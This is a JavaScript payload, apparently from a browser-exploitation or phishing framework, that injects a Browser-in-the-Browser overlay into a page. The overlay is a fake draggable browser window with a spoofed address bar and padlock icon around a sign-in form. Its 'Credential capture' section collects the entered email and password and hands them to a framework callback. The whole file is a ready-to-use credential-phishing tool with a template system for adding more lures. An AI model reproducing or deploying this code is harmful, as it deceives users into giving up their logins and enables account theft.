// bitb_phish.js — Browser-in-Browser overlay
// Generic template only — no company branding.
// Add your own templates: param = template name defined in TEMPLATES below.

const TEMPLATES = {
  "login": {
    title: "Secure Login",
    url: "https://login.example.com",
    favicon: "",
    body: `
      <div style="font-family:sans-serif;padding:40px 48px;max-width:380px;margin:0 auto;">
        <h2 style="margin:0 0 8px;font-size:24px;font-weight:400;">Sign in</h2>
        <p style="margin:0 0 24px;color:#666;font-size:14px;">Enter your credentials to continue</p>
        <input id="pz_email" type="email" placeholder="Email address"
          style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:12px;outline:none;">
        <input id="pz_pass" type="password" placeholder="Password"
          style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:20px;outline:none;">
        <button id="pz_submit"
          style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;">
          Continue
        </button>
        <p style="text-align:center;margin-top:16px;font-size:13px;color:#999;">
          <a href="#" style="color:#1a73e8;text-decoration:none;">Forgot password?</a>
        </p>
      </div>
    `
  }
};

const tplName = (typeof param !== 'undefined' && param) ? param : 'login';
const tpl = TEMPLATES[tplName] || TEMPLATES['login'];

// ── Build fake browser chrome ─────────────────────────────────────────────────
const overlay = document.createElement('div');
overlay.id = '__pz_bitb';
overlay.style.cssText = `
  position:fixed;top:0;left:0;width:100%;height:100%;
  background:rgba(0,0,0,0.55);z-index:2147483647;
  display:flex;align-items:center;justify-content:center;
`;

const win = document.createElement('div');
win.style.cssText = `
  width:440px;border-radius:10px;overflow:hidden;
  box-shadow:0 24px 64px rgba(0,0,0,0.45);
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  background:#fff;user-select:none;
`;

// Title bar
const titleBar = document.createElement('div');
titleBar.style.cssText = `
  background:#e8e8e8;padding:10px 14px;display:flex;align-items:center;gap:8px;
  cursor:move;
`;
titleBar.innerHTML = `
  <span style="display:flex;gap:6px;">
    <span id="__pz_bitb_close" style="width:12px;height:12px;border-radius:50%;background:#ff5f57;cursor:pointer;display:inline-block;"></span>
    <span style="width:12px;height:12px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
    <span style="width:12px;height:12px;border-radius:50%;background:#28c840;display:inline-block;"></span>
  </span>
  <div style="flex:1;background:#fff;border-radius:4px;padding:4px 10px;font-size:12px;color:#333;display:flex;align-items:center;gap:6px;">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="#1a73e8">
      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
    </svg>
    <span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${tpl.url}</span>
  </div>
`;

// Content area
const content = document.createElement('div');
content.innerHTML = tpl.body;

win.appendChild(titleBar);
win.appendChild(content);
overlay.appendChild(win);
document.body.appendChild(overlay);

// ── Draggable ─────────────────────────────────────────────────────────────────
let dragging = false, ox = 0, oy = 0;
titleBar.addEventListener('mousedown', e => {
  dragging = true;
  ox = e.clientX - win.getBoundingClientRect().left;
  oy = e.clientY - win.getBoundingClientRect().top;
  win.style.position = 'relative';
});
document.addEventListener('mousemove', e => {
  if (!dragging) return;
  win.style.left = (e.clientX - ox) + 'px';
  win.style.top  = (e.clientY - oy) + 'px';
});
document.addEventListener('mouseup', () => { dragging = false; });

// ── Close button ──────────────────────────────────────────────────────────────
document.getElementById('__pz_bitb_close').addEventListener('click', () => {
  overlay.remove();
});

// Dismiss on backdrop click
overlay.addEventListener('click', e => { if (e.target === overlay) overlay.remove(); });

// ── Credential capture ────────────────────────────────────────────────────────
const submitBtn = document.getElementById('pz_submit');
if (submitBtn) {
  submitBtn.addEventListener('click', () => {
    const email = document.getElementById('pz_email')?.value || '';
    const pass  = document.getElementById('pz_pass')?.value || '';
    __pzResult({ template: tplName, email, password: pass });
    overlay.remove();
  });
}

return '__async__';
